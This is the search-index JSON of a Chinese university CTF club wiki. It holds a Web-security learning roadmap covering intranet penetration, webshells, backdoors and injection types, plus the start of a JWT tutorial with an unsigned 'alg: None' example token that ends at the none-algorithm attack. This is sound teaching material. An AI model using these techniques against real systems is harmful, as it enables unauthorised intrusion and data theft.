{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction \u00b6 \u6b22\u8fce\u8bbf\u95ee SCU-CTF \u534f\u4f1a\u7684\u4e3b\u9875\uff0cSCU-CTF\u534f\u4f1a\u96b6\u5c5e\u4e8e\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5b66\u9662\uff0c\u81f4\u529b\u4e8e\u7814\u7a76\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u7684\u76f8\u5173\u5185\u5bb9\uff0c\u5e76\u79ef\u6781\u7ec4\u7ec7\u534f\u4f1a\u6210\u5458\u53c2\u52a0\u56fd\u5185\u5404\u7c7b\u5b89\u5168\u7ade\u8d5b\u3002 QQ\u7fa4\uff1a \u70b9\u51fb\u52a0\u7fa4 \u7ec3\u4e60\u5e73\u53f0\uff1a \u70b9\u51fb\u8fdb\u5165","title":"Introduction"},{"location":"#introduction","text":"\u6b22\u8fce\u8bbf\u95ee SCU-CTF \u534f\u4f1a\u7684\u4e3b\u9875\uff0cSCU-CTF\u534f\u4f1a\u96b6\u5c5e\u4e8e\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5b66\u9662\uff0c\u81f4\u529b\u4e8e\u7814\u7a76\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u7684\u76f8\u5173\u5185\u5bb9\uff0c\u5e76\u79ef\u6781\u7ec4\u7ec7\u534f\u4f1a\u6210\u5458\u53c2\u52a0\u56fd\u5185\u5404\u7c7b\u5b89\u5168\u7ade\u8d5b\u3002 QQ\u7fa4\uff1a \u70b9\u51fb\u52a0\u7fa4 \u7ec3\u4e60\u5e73\u53f0\uff1a \u70b9\u51fb\u8fdb\u5165","title":"Introduction"},{"location":"CTFWiki/Web/","text":"Web\u5b66\u4e60\u8def\u7ebf \u00b6 \u5199\u5728\u524d\u9762 \u00b6 \u4e0d\u8981\u628aCTF\u6bd4\u8d5b\u5f53\u6210\u4f60\u5b66\u4e60\u7684\u5168\u90e8\uff0c\u5728\u540e\u9762\u5e0c\u671b\u5b66\u5f1f\u5b66\u59b9\u4eec\u80fd\u591a\u770b\u770b\u5916\u9762\u7684\u4e16\u754c\uff0c\u4e86\u89e3\u5b89\u5168\u5708\u6700\u65b0\u52a8\u6001\u627e\u5230\u4f60\u6700\u9002\u5408\u7684\u65b9\u5411 Web\u5728CTF\u5f53\u4e2d\u7684\u5206\u7c7b \u00b6 \u5728CTF\u6bd4\u8d5b\u4e2d\uff0cWeb\u6709\u51e0\u5927\u5206\u7c7b\uff1a \u89e3\u9898\u6a21\u5f0f\uff1a\u901a\u5e38\u662f0day\u6316\u6398(\u4e3b\u8981\u662fPHP\u5199\u7684\u5404\u7c7bCMS\u7684\u6f0f\u6d1e\u6316\u6398)\u3001nday\u5229\u7528(Java\u3001nodejs)\uff1b\u5f53\u7136\u4f20\u7edf\u9898\u578b\u4e5f\u662f\u6709\u7684\uff0c\u4e3b\u8981\u662fBypass Waf\uff0c\u4e5f\u5c31\u662f\u7ed5\u8fc7\u9898\u76ee\u4e2d\u7684\u9650\u5236\u8fdb\u884c\u5229\u7528 AWD\uff1a \u65e9\u671f\u6d41\u884c\u7684\u653b\u9632\u6a21\u5f0f\uff0c\u4e3b\u8981\u662fWeb\uff0c\u901a\u5e38\u90fd\u80fd\u76f4\u63a5\u5728\u7f51\u4e0a\u641c\u5230\u7684nday\u6f0f\u6d1e\uff0c\u96be\u70b9\u5728\u4e8e\u62ff\u5230Webshell\u540e\u7684\u6743\u9650\u7ef4\u6301 AWD+\uff1a \u89e3\u9898\u4e0eAWD\u7684\u6df7\u5408\u6a21\u5f0f\uff0c\u7531\u4e8eAWD\u6a21\u5f0f\u4e0b\u9009\u624b\u76f4\u63a5\u4e92\u76f8\u5e72\u6270\u60c5\u51b5\u4e25\u91cd\u63a8\u51fa\u7684\u65b0\u6a21\u5f0f\uff0c\u5206\u4e3aBuild\u4e0eFix\u4e24\u4e2a\u9636\u6bb5\uff0c\u7b2c\u4e00\u9636\u6bb5\u5c31\u662f\u5e38\u89c4\u7684CTF\u9898\u76ee\uff0c\u800c\u7b2c\u4e8c\u9636\u6bb5\u5219\u5bf9\u4e4b\u524d\u7684Web\u9898\u76ee\u8fdb\u884c\u4fee\u590d \u5185\u7f51\u6e17\u900f\uff1a \u4e3b\u8981\u662f\u540e\u6e17\u900f\uff0c\u51fa\u73b0\u5728\u7ebf\u4e0b\u6bd4\u8d5b\u5f53\u4e2d\uff0c\u9996\u5148\u524d\u53f0\u4f1a\u7559\u7ed9\u4f60\u4e00\u4e2a\u5229\u7528\u70b9\u80fd\u83b7\u5f97Webshell\uff0c\u63a5\u7740\u5229\u7528\u5165\u4fb5\u6210\u529f\u7684\u5916\u7f51\u670d\u52a1\u5668\u4f5c\u4e3a\u8df3\u677f\uff0c\u653b\u51fb\u5185\u7f51\u5176\u4ed6\u670d\u52a1\u5668\uff0c\u6700\u540e\u83b7\u5f97\u654f\u611f\u6570\u636e\uff0c\u5e76\u5c06\u6570\u636e\u4f20\u9012\u5230\u653b\u51fb\u8005\uff0c\u770b\u60c5\u51b5\u5b89\u88c5\u957f\u671f\u540e\u95e8\uff0c\u5b9e\u73b0\u957f\u671f\u63a7\u5236\u548c\u83b7\u5f97\u654f\u611f\u6570\u636e\u7684\u65b9\u5f0f Web\u6280\u80fd\u6808 \u00b6 \u4f60\u9700\u8981\u77e5\u9053\u5e38\u89c1\u7684\u7f16\u7a0b\u8bed\u8a00\uff1aPHP\u3001Java\u3001nodejs\u3001python \u5355\u8003\u70b9\u4e3b\u8981\u662f\uff1a\u4fe1\u606f\u6cc4\u9732\u3001SSTI(\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165)\u3001XSS(\u8de8\u7ad9\u811a\u672c\u653b\u51fb)\u3001Bypass Waf\u3001SQLI(SQL\u6ce8\u5165)\u3001XXE(XML\u5916\u90e8\u5b9e\u4f53)\u3001Unserialize(\u53cd\u5e8f\u5217\u5316\u653b\u51fb)\u3001nday\u5229\u7528\u3001\u5bc6\u94a5\u4f2a\u9020\u3001Xs-leaks\u653b\u51fb\u7b49 \u5237\u9898\u8def\u7ebf \u00b6 1. \u653b\u9632\u4e16\u754c \u53ea\u9700\u8981\u5237\u4e00\u5237Web\u65b0\u624b\u533a\u5373\u53ef\uff0c\u5b66\u4e60\u65f6\u9700\u8981\u4f60\u767e\u5ea6\u641c\u7d22\u89e3\u6cd5\u5e76\u4e86\u89e3\uff0c\u8fd9\u4e2a\u63a5\u65ad\u4e3b\u8981\u662f\u57f9\u517b\u5bf9Web\u7684\u57fa\u672c\u611f\u89c9 2. CTFHub \u5f00\u59cb\u8fdb\u5165\u7cfb\u7edf\u5b66\u4e60\u622a\u65ad\uff0c\u6ce8\u518c\u5237\u6280\u80fd\u6811Web\u5206\u7c7b\uff0c\u6d89\u53ca\u4fe1\u606f\u6cc4\u9732\u3001\u5bc6\u7801\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001XSS\u3001XSS\u3001\u6587\u4ef6\u4e0a\u4f20\u3001RCE\u3001SSRF\u7b49 3. BUUCTF \u8fd9\u4e2a\u65f6\u5019\u4f60\u5df2\u7ecf\u5177\u5907\u4e86\u4e00\u5b9a\u7684\u80fd\u529b\uff0c\u53ef\u4ee5\u5f00\u59cb\u5b66\u4e60\u4e00\u4e9b\u96be\u9898\u4e86\uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u4e0d\u65ad\u62d3\u5c55\u96be\u5ea6\u6df1\u5165\u5b66\u4e60\u7684\u8fc7\u7a0b \u5728BUUCTF\u5237\u4e86\u4e00\u6bb5\u65f6\u95f4\u540e\u53ef\u4ee5\u5c1d\u8bd5\u62a5\u540dCTF\u6bd4\u8d5b\uff0c\u5f7b\u5e95\u5f00\u542f\u4f60\u7684\u5b89\u5168\u4e4b\u65c5 \u8be6\u7ec6\u5b66\u4e60\u8def\u7ebf \u00b6 1.\u9996\u5148\u4f60\u9700\u8981\u4e86\u89e3Web\u5b89\u5168\u7684\u4e00\u4e9b\u76f8\u5173\u57fa\u672c\u6982\u5ff5\uff0c\u901a\u8fc7Google\u6216\u8005Baidu\u67e5\u770bOwasp top10\u653b\u51fb\u5229\u7528\u7c7b\u578b\uff0c\u5b66\u4f1a\u4f7f\u7528github\u641c\u7d22 2.\u5b66\u4e60\u5e38\u89c1\u5de5\u5177\u7684\u4f7f\u7528(BurpSuite\u3001sqlmap\u3001dirsearch\u3001AntSword) \u4e0b\u8f7d\u65e0\u540e\u95e8\u7248\u7684\u8fd9\u4e9b\u8f6f\u4ef6\u8fdb\u884c\u5b89\u88c5\uff0c\u767e\u5ea6\u5982Burpsuite\u7684\u57fa\u672c\u4f7f\u7528 3.\u5b9e\u6218\u64cd\u4f5c\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u8003\u672cWiki\u5f53\u4e2d\u5185\u5bb9\u914d\u5408Google\\Baidu\u5b66\u4e60 \u4e86\u89e3SQL\u6ce8\u5165\u7684\u79cd\u7c7b\u3001\u6ce8\u5165\u539f\u7406\u3001\u624b\u52a8\u6ce8\u5165\u6280\u5de7 \u7814\u7a76\u6587\u4ef6\u4e0a\u4f20\u7684\u539f\u7406\uff0c\u5982\u4f55\u8fdb\u884c\u622a\u65ad\u3001\u53cc\u91cd\u540e\u7f00\u6b3a\u9a97(IIS\u3001PHP)\u3001\u89e3\u6790\u6f0f\u6d1e\u5229\u7528\uff08IIS\u3001Nignix\u3001Apache\uff09\u7b49\uff0c\u53c2\u7167\uff1a \u4e0a\u4f20\u653b\u51fb\u6846\u67b6 \uff1b \u7814\u7a76XSS\u5f62\u6210\u7684\u539f\u7406\u548c\u79cd\u7c7b\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a XSS \uff1b linux\u4e0ewindows\u5e38\u89c1\u7cfb\u7edf\u547d\u4ee4\uff0cGoogle\\Baidu\u641c\u7d22CTF\u547d\u4ee4\u6267\u884c\u4e0e\u7ed5\u8fc7\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a \u547d\u4ee4\u6267\u884c\u7ed5\u8fc7 \u7814\u7a76XXE\u5f62\u6210\u7684\u539f\u7406\u548c\u79cd\u7c7b\uff0c\u53ef\u4ee5\u53c2\u8003: \u6d45\u8c08XXE\u6f0f\u6d1e\u539f\u7406 4.\u5b66\u4e60\u4e00\u95e8\u811a\u672c\u7f16\u7a0b\u8bed\u8a00\uff0c\u9009\u62e9\u811a\u672c\u8bed\u8a00Perl/Python/PHP/Go/Java\u4e2d\u7684\u4e00\u79cd\uff0c\u5bf9\u5e38\u7528\u5e93\u8fdb\u884c\u7f16\u7a0b\u5b66\u4e60\uff0c\u8fd9\u5728CTF\u5f53\u4e2d\u5c06\u4f1a\u5927\u5927\u7b80\u5316\u6211\u4eec\u7684\u5229\u7528\u64cd\u4f5c\uff0c\u8fd9\u91cc\u63a8\u8350Python\uff0c\u5148\u7b80\u7b80\u5355\u5355\u770b\u770b\u83dc\u9e1f\u6559\u7a0b\u5e76\u52a8\u624b\u5b66\u4e60\u5373\u53ef\uff0c\u5b66\u4e60\u8bed\u6cd5\u3001\u6b63\u5219\u3001\u6587\u4ef6\u3001\u7f51\u7edc\u3001\u591a\u7ebf\u7a0b\u7b49\u5e38\u7528\u5e93 5.\u6e90\u7801\u5ba1\u8ba1\u4e0e\u6f0f\u6d1e\u5206\u6790\uff0c\u9700\u8981\u4f60\u80fd\u72ec\u7acb\u5206\u6790\u811a\u672c\u6e90\u7801\u7a0b\u5e8f\u5e76\u53d1\u73b0\u5b89\u5168\u95ee\u9898 \u719f\u6089\u6e90\u7801\u5ba1\u8ba1\u7684\u52a8\u6001\u548c\u9759\u6001\u65b9\u6cd5\uff0c\u5e76\u77e5\u9053\u5982\u4f55\u53bb\u5206\u6790\u7a0b\u5e8f\uff0c\u53c2\u89c1 SecWiki-\u5ba1\u8ba1 \uff1b \u4eceWooyun\u4e0a\u5bfb\u627e\u5f00\u6e90\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u5e76\u8bd5\u7740\u81ea\u5df1\u5206\u6790\uff1b \u4e86\u89e3Web\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0\uff0c\u7136\u540e\u901a\u8fc7\u5173\u952e\u5b57\u8fdb\u884c\u67e5\u627e\u5206\u6790\uff0c\u53c2\u89c1 SecWiki-\u4ee3\u7801\u5ba1\u8ba1 \u3001 \u9ad8\u7ea7PHP\u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u5ba1\u6838\u6280\u672f \uff1b \u7814\u7a76Web\u6f0f\u6d1e\u5f62\u6210\u539f\u7406\u548c\u5982\u4f55\u4ece\u6e90\u7801\u5c42\u9762\u907f\u514d\u8be5\u7c7b\u6f0f\u6d1e\uff0c\u5e76\u6574\u7406\u6210checklist\u3002","title":"Web\u5b66\u4e60\u8def\u7ebf"},{"location":"CTFWiki/Web/#web","text":"","title":"Web\u5b66\u4e60\u8def\u7ebf"},{"location":"CTFWiki/Web/#_1","text":"\u4e0d\u8981\u628aCTF\u6bd4\u8d5b\u5f53\u6210\u4f60\u5b66\u4e60\u7684\u5168\u90e8\uff0c\u5728\u540e\u9762\u5e0c\u671b\u5b66\u5f1f\u5b66\u59b9\u4eec\u80fd\u591a\u770b\u770b\u5916\u9762\u7684\u4e16\u754c\uff0c\u4e86\u89e3\u5b89\u5168\u5708\u6700\u65b0\u52a8\u6001\u627e\u5230\u4f60\u6700\u9002\u5408\u7684\u65b9\u5411","title":"\u5199\u5728\u524d\u9762"},{"location":"CTFWiki/Web/#webctf","text":"\u5728CTF\u6bd4\u8d5b\u4e2d\uff0cWeb\u6709\u51e0\u5927\u5206\u7c7b\uff1a \u89e3\u9898\u6a21\u5f0f\uff1a\u901a\u5e38\u662f0day\u6316\u6398(\u4e3b\u8981\u662fPHP\u5199\u7684\u5404\u7c7bCMS\u7684\u6f0f\u6d1e\u6316\u6398)\u3001nday\u5229\u7528(Java\u3001nodejs)\uff1b\u5f53\u7136\u4f20\u7edf\u9898\u578b\u4e5f\u662f\u6709\u7684\uff0c\u4e3b\u8981\u662fBypass Waf\uff0c\u4e5f\u5c31\u662f\u7ed5\u8fc7\u9898\u76ee\u4e2d\u7684\u9650\u5236\u8fdb\u884c\u5229\u7528 AWD\uff1a \u65e9\u671f\u6d41\u884c\u7684\u653b\u9632\u6a21\u5f0f\uff0c\u4e3b\u8981\u662fWeb\uff0c\u901a\u5e38\u90fd\u80fd\u76f4\u63a5\u5728\u7f51\u4e0a\u641c\u5230\u7684nday\u6f0f\u6d1e\uff0c\u96be\u70b9\u5728\u4e8e\u62ff\u5230Webshell\u540e\u7684\u6743\u9650\u7ef4\u6301 AWD+\uff1a \u89e3\u9898\u4e0eAWD\u7684\u6df7\u5408\u6a21\u5f0f\uff0c\u7531\u4e8eAWD\u6a21\u5f0f\u4e0b\u9009\u624b\u76f4\u63a5\u4e92\u76f8\u5e72\u6270\u60c5\u51b5\u4e25\u91cd\u63a8\u51fa\u7684\u65b0\u6a21\u5f0f\uff0c\u5206\u4e3aBuild\u4e0eFix\u4e24\u4e2a\u9636\u6bb5\uff0c\u7b2c\u4e00\u9636\u6bb5\u5c31\u662f\u5e38\u89c4\u7684CTF\u9898\u76ee\uff0c\u800c\u7b2c\u4e8c\u9636\u6bb5\u5219\u5bf9\u4e4b\u524d\u7684Web\u9898\u76ee\u8fdb\u884c\u4fee\u590d \u5185\u7f51\u6e17\u900f\uff1a \u4e3b\u8981\u662f\u540e\u6e17\u900f\uff0c\u51fa\u73b0\u5728\u7ebf\u4e0b\u6bd4\u8d5b\u5f53\u4e2d\uff0c\u9996\u5148\u524d\u53f0\u4f1a\u7559\u7ed9\u4f60\u4e00\u4e2a\u5229\u7528\u70b9\u80fd\u83b7\u5f97Webshell\uff0c\u63a5\u7740\u5229\u7528\u5165\u4fb5\u6210\u529f\u7684\u5916\u7f51\u670d\u52a1\u5668\u4f5c\u4e3a\u8df3\u677f\uff0c\u653b\u51fb\u5185\u7f51\u5176\u4ed6\u670d\u52a1\u5668\uff0c\u6700\u540e\u83b7\u5f97\u654f\u611f\u6570\u636e\uff0c\u5e76\u5c06\u6570\u636e\u4f20\u9012\u5230\u653b\u51fb\u8005\uff0c\u770b\u60c5\u51b5\u5b89\u88c5\u957f\u671f\u540e\u95e8\uff0c\u5b9e\u73b0\u957f\u671f\u63a7\u5236\u548c\u83b7\u5f97\u654f\u611f\u6570\u636e\u7684\u65b9\u5f0f","title":"Web\u5728CTF\u5f53\u4e2d\u7684\u5206\u7c7b"},{"location":"CTFWiki/Web/#web_1","text":"\u4f60\u9700\u8981\u77e5\u9053\u5e38\u89c1\u7684\u7f16\u7a0b\u8bed\u8a00\uff1aPHP\u3001Java\u3001nodejs\u3001python \u5355\u8003\u70b9\u4e3b\u8981\u662f\uff1a\u4fe1\u606f\u6cc4\u9732\u3001SSTI(\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165)\u3001XSS(\u8de8\u7ad9\u811a\u672c\u653b\u51fb)\u3001Bypass Waf\u3001SQLI(SQL\u6ce8\u5165)\u3001XXE(XML\u5916\u90e8\u5b9e\u4f53)\u3001Unserialize(\u53cd\u5e8f\u5217\u5316\u653b\u51fb)\u3001nday\u5229\u7528\u3001\u5bc6\u94a5\u4f2a\u9020\u3001Xs-leaks\u653b\u51fb\u7b49","title":"Web\u6280\u80fd\u6808"},{"location":"CTFWiki/Web/#_2","text":"1. \u653b\u9632\u4e16\u754c \u53ea\u9700\u8981\u5237\u4e00\u5237Web\u65b0\u624b\u533a\u5373\u53ef\uff0c\u5b66\u4e60\u65f6\u9700\u8981\u4f60\u767e\u5ea6\u641c\u7d22\u89e3\u6cd5\u5e76\u4e86\u89e3\uff0c\u8fd9\u4e2a\u63a5\u65ad\u4e3b\u8981\u662f\u57f9\u517b\u5bf9Web\u7684\u57fa\u672c\u611f\u89c9 2. CTFHub \u5f00\u59cb\u8fdb\u5165\u7cfb\u7edf\u5b66\u4e60\u622a\u65ad\uff0c\u6ce8\u518c\u5237\u6280\u80fd\u6811Web\u5206\u7c7b\uff0c\u6d89\u53ca\u4fe1\u606f\u6cc4\u9732\u3001\u5bc6\u7801\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001XSS\u3001XSS\u3001\u6587\u4ef6\u4e0a\u4f20\u3001RCE\u3001SSRF\u7b49 3. BUUCTF \u8fd9\u4e2a\u65f6\u5019\u4f60\u5df2\u7ecf\u5177\u5907\u4e86\u4e00\u5b9a\u7684\u80fd\u529b\uff0c\u53ef\u4ee5\u5f00\u59cb\u5b66\u4e60\u4e00\u4e9b\u96be\u9898\u4e86\uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u4e0d\u65ad\u62d3\u5c55\u96be\u5ea6\u6df1\u5165\u5b66\u4e60\u7684\u8fc7\u7a0b \u5728BUUCTF\u5237\u4e86\u4e00\u6bb5\u65f6\u95f4\u540e\u53ef\u4ee5\u5c1d\u8bd5\u62a5\u540dCTF\u6bd4\u8d5b\uff0c\u5f7b\u5e95\u5f00\u542f\u4f60\u7684\u5b89\u5168\u4e4b\u65c5","title":"\u5237\u9898\u8def\u7ebf"},{"location":"CTFWiki/Web/#_3","text":"1.\u9996\u5148\u4f60\u9700\u8981\u4e86\u89e3Web\u5b89\u5168\u7684\u4e00\u4e9b\u76f8\u5173\u57fa\u672c\u6982\u5ff5\uff0c\u901a\u8fc7Google\u6216\u8005Baidu\u67e5\u770bOwasp top10\u653b\u51fb\u5229\u7528\u7c7b\u578b\uff0c\u5b66\u4f1a\u4f7f\u7528github\u641c\u7d22 2.\u5b66\u4e60\u5e38\u89c1\u5de5\u5177\u7684\u4f7f\u7528(BurpSuite\u3001sqlmap\u3001dirsearch\u3001AntSword) \u4e0b\u8f7d\u65e0\u540e\u95e8\u7248\u7684\u8fd9\u4e9b\u8f6f\u4ef6\u8fdb\u884c\u5b89\u88c5\uff0c\u767e\u5ea6\u5982Burpsuite\u7684\u57fa\u672c\u4f7f\u7528 3.\u5b9e\u6218\u64cd\u4f5c\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u8003\u672cWiki\u5f53\u4e2d\u5185\u5bb9\u914d\u5408Google\\Baidu\u5b66\u4e60 \u4e86\u89e3SQL\u6ce8\u5165\u7684\u79cd\u7c7b\u3001\u6ce8\u5165\u539f\u7406\u3001\u624b\u52a8\u6ce8\u5165\u6280\u5de7 \u7814\u7a76\u6587\u4ef6\u4e0a\u4f20\u7684\u539f\u7406\uff0c\u5982\u4f55\u8fdb\u884c\u622a\u65ad\u3001\u53cc\u91cd\u540e\u7f00\u6b3a\u9a97(IIS\u3001PHP)\u3001\u89e3\u6790\u6f0f\u6d1e\u5229\u7528\uff08IIS\u3001Nignix\u3001Apache\uff09\u7b49\uff0c\u53c2\u7167\uff1a \u4e0a\u4f20\u653b\u51fb\u6846\u67b6 \uff1b \u7814\u7a76XSS\u5f62\u6210\u7684\u539f\u7406\u548c\u79cd\u7c7b\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a XSS \uff1b linux\u4e0ewindows\u5e38\u89c1\u7cfb\u7edf\u547d\u4ee4\uff0cGoogle\\Baidu\u641c\u7d22CTF\u547d\u4ee4\u6267\u884c\u4e0e\u7ed5\u8fc7\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a \u547d\u4ee4\u6267\u884c\u7ed5\u8fc7 \u7814\u7a76XXE\u5f62\u6210\u7684\u539f\u7406\u548c\u79cd\u7c7b\uff0c\u53ef\u4ee5\u53c2\u8003: \u6d45\u8c08XXE\u6f0f\u6d1e\u539f\u7406 4.\u5b66\u4e60\u4e00\u95e8\u811a\u672c\u7f16\u7a0b\u8bed\u8a00\uff0c\u9009\u62e9\u811a\u672c\u8bed\u8a00Perl/Python/PHP/Go/Java\u4e2d\u7684\u4e00\u79cd\uff0c\u5bf9\u5e38\u7528\u5e93\u8fdb\u884c\u7f16\u7a0b\u5b66\u4e60\uff0c\u8fd9\u5728CTF\u5f53\u4e2d\u5c06\u4f1a\u5927\u5927\u7b80\u5316\u6211\u4eec\u7684\u5229\u7528\u64cd\u4f5c\uff0c\u8fd9\u91cc\u63a8\u8350Python\uff0c\u5148\u7b80\u7b80\u5355\u5355\u770b\u770b\u83dc\u9e1f\u6559\u7a0b\u5e76\u52a8\u624b\u5b66\u4e60\u5373\u53ef\uff0c\u5b66\u4e60\u8bed\u6cd5\u3001\u6b63\u5219\u3001\u6587\u4ef6\u3001\u7f51\u7edc\u3001\u591a\u7ebf\u7a0b\u7b49\u5e38\u7528\u5e93 5.\u6e90\u7801\u5ba1\u8ba1\u4e0e\u6f0f\u6d1e\u5206\u6790\uff0c\u9700\u8981\u4f60\u80fd\u72ec\u7acb\u5206\u6790\u811a\u672c\u6e90\u7801\u7a0b\u5e8f\u5e76\u53d1\u73b0\u5b89\u5168\u95ee\u9898 \u719f\u6089\u6e90\u7801\u5ba1\u8ba1\u7684\u52a8\u6001\u548c\u9759\u6001\u65b9\u6cd5\uff0c\u5e76\u77e5\u9053\u5982\u4f55\u53bb\u5206\u6790\u7a0b\u5e8f\uff0c\u53c2\u89c1 SecWiki-\u5ba1\u8ba1 \uff1b \u4eceWooyun\u4e0a\u5bfb\u627e\u5f00\u6e90\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u5e76\u8bd5\u7740\u81ea\u5df1\u5206\u6790\uff1b \u4e86\u89e3Web\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0\uff0c\u7136\u540e\u901a\u8fc7\u5173\u952e\u5b57\u8fdb\u884c\u67e5\u627e\u5206\u6790\uff0c\u53c2\u89c1 SecWiki-\u4ee3\u7801\u5ba1\u8ba1 \u3001 \u9ad8\u7ea7PHP\u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u5ba1\u6838\u6280\u672f \uff1b \u7814\u7a76Web\u6f0f\u6d1e\u5f62\u6210\u539f\u7406\u548c\u5982\u4f55\u4ece\u6e90\u7801\u5c42\u9762\u907f\u514d\u8be5\u7c7b\u6f0f\u6d1e\uff0c\u5e76\u6574\u7406\u6210checklist\u3002","title":"\u8be6\u7ec6\u5b66\u4e60\u8def\u7ebf"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/","text":"JWT\u7b80\u8981\u4ecb\u7ecd \u00b6 \u4ecb\u7ecd \u00b6 jwt(JSON Web Token)\u662f\u4e00\u4e32json\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u7531\u670d\u52a1\u7aef\u7528\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u4fe1\u606f\u7b7e\u540d\u6765\u4fdd\u8bc1\u5176\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u4f2a\u9020\u3002Token\u91cc\u53ef\u4ee5\u5305\u542b\u6240\u6709\u5fc5\u8981\u4fe1\u606f\uff0c\u8fd9\u6837\u670d\u52a1\u7aef\u5c31\u65e0\u9700\u4fdd\u5b58\u4efb\u4f55\u5173\u4e8e\u7528\u6237\u6216\u4f1a\u8bdd\u7684\u4fe1\u606f\uff0cJWT\u53ef\u7528\u4e8e\u8eab\u4efd\u8ba4\u8bc1\u3001\u4f1a\u8bdd\u72b6\u6001\u7ef4\u6301\u3001\u4fe1\u606f\u4ea4\u6362\u7b49\u3002\u5b83\u7684\u51fa\u73b0\u662f\u4e3a\u4e86\u5728\u7f51\u7edc\u5e94\u7528\u73af\u5883\u95f4\u4f20\u9012\u58f0\u660e\u800c\u6267\u884c\u7684\u4e00\u79cd\u57fa\u4e8eJSON\u7684\u5f00\u653e\u6807\u51c6\uff08 (RFC 7519 ).\u8be5token\u88ab\u8bbe\u8ba1\u4e3a\u7d27\u51d1\u4e14\u5b89\u5168\u7684\uff0c\u7279\u522b\u9002\u7528\u4e8e\u5206\u5e03\u5f0f\u7ad9\u70b9\u7684\u5355\u70b9\u767b\u5f55\uff08SSO\uff09\u573a\u666f\u3002 \u4e00\u4e2ajwt token\u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff0cheader\u3001payload\u4e0esignature\uff0c\u4ee5\u70b9\u9694\u5f00\uff0c\u5f62\u5982 aaaa.bbbb.cccc \u3002 \u4e00\u4e2a\u5177\u4f53\u7684\u4f8b\u5b50\uff1a eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ header\u7528\u6765\u58f0\u660etoken\u7684\u7c7b\u578b\u548c\u7b7e\u540d\u7528\u7684\u7b97\u6cd5\u7b49\uff0c\u9700\u8981\u7ecf\u8fc7Base64Url\u7f16\u7801\u3002\u6bd4\u5982\u4ee5\u4e0atoken\u7684\u5934\u90e8\u7ecf\u8fc7base64\u89e3\u7801\u540e\u4e3a {\"alg\":\"HS256\",\"typ\":\"JWT\"} eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 \u89e3\u7801\u4e3a { \"alg\": \"HS256\", \"typ\": \"JWT\" } alg\u5c5e\u6027\u8868\u793a\u7b7e\u540d\u7684\u7b97\u6cd5\uff08algorithm\uff09\uff0c\u9ed8\u8ba4\u662f HMAC SHA256\uff08\u5199\u6210 HS256\uff09\uff1b typ\u5c5e\u6027\u8868\u793a\u8fd9\u4e2a\u4ee4\u724c\uff08token\uff09\u7684\u7c7b\u578b\uff08type\uff09\uff0cJWT \u4ee4\u724c\u7edf\u4e00\u5199\u4e3aJWT payload\u7528\u6765\u8868\u793a\u771f\u6b63\u7684token\u4fe1\u606f\uff0c\u4e5f\u9700\u8981\u7ecf\u8fc7Base64Url\u7f16\u7801\u3002\u6bd4\u5982\u4ee5\u4e0atoken\u7684payload\u7ecf\u8fc7\u89e3\u7801\u540e\u4e3a {\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022} eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ \u89e3\u7801\u4e3a { \"sub\": \"1234567890\", \"name\": \"John Doe\", \"iat\": 1516239022 } JWT \u89c4\u5b9a\u4e867\u4e2a\u5b98\u65b9\u5b57\u6bb5\uff0c\u4f9b\u9009\u7528 iss (issuer)\uff1a\u7b7e\u53d1\u4eba exp (expiration time)\uff1a\u8fc7\u671f\u65f6\u95f4 sub (subject)\uff1a\u4e3b\u9898 aud (audience)\uff1a\u53d7\u4f17 nbf (Not Before)\uff1a\u751f\u6548\u65f6\u95f4 iat (Issued At)\uff1a\u7b7e\u53d1\u65f6\u95f4 jti (JWT ID)\uff1a\u7f16\u53f7 signature\uff0c\u5c06\u524d\u4e24\u90e8\u5206\u7528 alg \u6307\u5b9a\u7684\u7b97\u6cd5\u52a0\u5bc6\uff0c\u518d\u7ecf\u8fc7Base64Url\u7f16\u7801\u5c31\u662fsignature\u4e86\uff0c\u4f5c\u7528\u662f\u9632\u6b62\u6570\u636e\u7be1\u6539\u3002 \u89e3\u7801 \u00b6 \u4e00\u822c\u63a8\u8350\u53bb http://jwt.io/ \u89e3\u7801\uff0c\u62ff\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50 \u89e3\u5bc6\u524d eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ \u89e3\u5bc6\u540e { \"alg\": \"None\", \"typ\": \"jwt\" } [ { \"sub\": \"user\" } ] JWT\u7684\u5b89\u5168\u95ee\u9898 \u00b6 1.\u4fee\u6539\u7b97\u6cd5\u4e3anone 